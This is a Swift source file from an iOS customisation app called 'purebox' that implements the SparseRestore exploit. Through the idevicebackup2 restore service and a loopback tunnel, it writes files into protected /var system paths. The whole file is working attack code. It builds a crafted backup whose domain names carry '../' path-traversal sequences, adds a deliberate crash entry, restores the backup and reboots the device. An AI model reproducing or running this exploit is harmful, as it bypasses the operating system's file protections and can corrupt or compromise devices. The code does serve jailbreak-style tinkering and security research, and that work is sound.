//
//  SparseRestore.swift
//  purebox
//
//  Created by Lrdsnow on 9/13/24.
//

import Foundation

let sparseRestoreLogPipe = Pipe()

class SparseRestore: NSObject {
    
    @objc public static func overwriteFile(_ from: URL, to: URL) {
        if to.path.contains("/var") {
            let target = URL.documents.appendingPathComponent("temp").appendingPathComponent(to.path)
            let targetDir = target.deletingLastPathComponent()
            try? FileManager.default.createDirectory(at: targetDir, withIntermediateDirectories: true)
            
            try? FileManager.default.copyItem(at: from, to: target)
            
            let backupInfoURL = URL.documents.appendingPathComponent("temp/backup_info.json")
            var backupInfo: [String] = []
            if let data = try? Data(contentsOf: backupInfoURL),
               let existingInfo = try? JSONSerialization.jsonObject(with: data, options: []) as? [String] {
                backupInfo = existingInfo
            }
            backupInfo.append(to.path)
            if let data = try? JSONSerialization.data(withJSONObject: backupInfo, options: .prettyPrinted) {
                try? data.write(to: backupInfoURL)
            }
        }
    }
    
    @objc public static func endExploit() {
        let tempBackupDir = URL.documents.appendingPathComponent("temp")
        let backupPath = URL.documents.appendingPathComponent("backup")
        let fm = FileManager.default
        defer { print("done") }
        if fm.fileExists(atPath: tempBackupDir.path) {
            try? fm.removeItem(at: backupPath)
            try? fm.createDirectory(at: backupPath, withIntermediateDirectories: true)
            
            start_emotional_damage("127.0.0.1:51820")
            
            setvbuf(stdout, nil, _IOLBF, 0)
            setvbuf(stderr, nil, _IONBF, 0)
            
            let key = URL.documents.appendingPathComponent("imported/PairingFile")
            if let contents = try? String(contentsOf: key),
               !contents.isEmpty {
                target_minimuxer_address()
                try? start(contents, backupPath.absoluteString)
            }
            
            let deviceList = MobileDevice.deviceList()
            guard deviceList.count == 1 else {
                log("Invalid device count: \(deviceList.count)")
                return
            }
            let udid = deviceList.first!
            
            var log = ""
            
//            Task.detached {
//                dup2(sparseRestoreLogPipe.fileHandleForWriting.fileDescriptor, fileno(stdout))
//                dup2(sparseRestoreLogPipe.fileHandleForWriting.fileDescriptor, fileno(stderr))
//                sparseRestoreLogPipe.fileHandleForReading.readabilityHandler = { fileHandle in
//                    let data = fileHandle.availableData
//                    if !data.isEmpty, var logString = String(data: data, encoding: .utf8) {
//                        if logString.contains(udid) {
//                            logString = logString.replacingOccurrences(of: udid, with: "<redacted>")
//                        }
//                        log.append(logString)
//                    }
//                }
//            }
            
            let folder = backupPath.appendingPathComponent(udid, conformingTo: .data)
            
            do {
                try? FileManager.default.removeItem(at: folder)
                try? FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
                
                var backupFiles: [BackupFile] = [
                    Directory(path: "", domain: "RootDomain"),
                    Directory(path: "Library", domain: "RootDomain"),
                    Directory(path: "Library/Preferences", domain: "RootDomain")
                ]
                
                let backupInfoURL = tempBackupDir.appendingPathComponent("backup_info.json")
                var backupInfo: [String] = []
                if let data = try? Data(contentsOf: backupInfoURL),
                   let existingInfo = try? JSONSerialization.jsonObject(with: data, options: []) as? [String] {
                    backupInfo = existingInfo
                }
                for file in backupInfo.indices {
                    let filePath = backupInfo[file]
                    do {
                        let fileContents = try Data(contentsOf: tempBackupDir.appendingPathComponent(filePath))
                        //backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../..\(file)", contents: ))
                        let to = URL(fileURLWithPath: filePath)
                        let folderPath = to.deletingLastPathComponent().path.replacingOccurrences(of: "//private/var", with: "/var")
                        let targetPath = to.path.replacingOccurrences(of: "//private/var", with: "/var")
                        var basePath = "var"
                        if #available(iOS 17.0, *) {
                            basePath = to.path.hasPrefix("/var/mobile/") ? "var/mobile" : "var"
                        }
                        backupFiles += [
                            ConcreteFile(path: "Library/Preferences/temp\(Int(file))", domain: "RootDomain", contents: fileContents, owner: 501, group: 501, inode: UInt64(file)),
                            Directory(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/backup\(folderPath)", owner: 501, group: 501),
                            ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/backup\(targetPath)", contents: Data(), owner: 501, group: 501, inode: UInt64(file)),
                            ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/.backup.i/var/root/Library/Preferences/temp\(Int(file))", contents: Data(), owner: 501, group: 501)
                        ]
                        
                    } catch {}
                }
                
                backupFiles += [
                    ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data())
                ]
                
                try? fm.removeItem(at: tempBackupDir)
                let mbdb = Backup(files: backupFiles)
                try mbdb.writeTo(directory: folder)

                var restoreArgs = [
                    "idevicebackup2",
                    "-n", "restore", "--no-reboot", "--system",
                    backupPath.path
                ]
                print("Executing args: \(restoreArgs)")
                var argv = restoreArgs.map{ strdup($0) }
                let result = idevicebackup2_main(Int32(restoreArgs.count), &argv)
                print("idevicebackup2 exited with code \(result)")
                try? FileManager.default.removeItem(at: backupPath)
                //guard log.contains("crash_on_purpose") else { return }

                print("Restore succeeded")
                
                print("rebooting")
                MobileDevice.rebootDevice(udid: udid)

                //sparseRestoreLogPipe.fileHandleForReading.readabilityHandler = nil
            } catch {
                print(error.localizedDescription)
                try? FileManager.default.removeItem(at: tempBackupDir)
                try? FileManager.default.removeItem(at: backupPath)
                return
            }
        }
    }
    
//    public static func createBackupFile(from: URL, to: URL) -> Backup {
//        // open the file and read the contents
//        let contents = try! Data(contentsOf: from)
//        
//        // required on iOS 17.0+ since /var/mobile is on a separate partition
//        let basePath = to.path.hasPrefix("/var/mobile/") ? "/var/mobile/backup" : "/var/backup"
//        
//        // create the backup
//        return Backup(files: [
//            //Directory(path: "", domain: "SysContainerDomain-../../../../../../../..\(basePath)\(to.deletingLastPathComponent().path)", owner: 501, group: 501),
//            //ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../..\(basePath)\(to.path)", contents: contents, owner: 501, group: 501),
//            ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../..\(to.path)", contents: contents, owner: 501, group: 501),
//            
//        ])
//    }
    
}
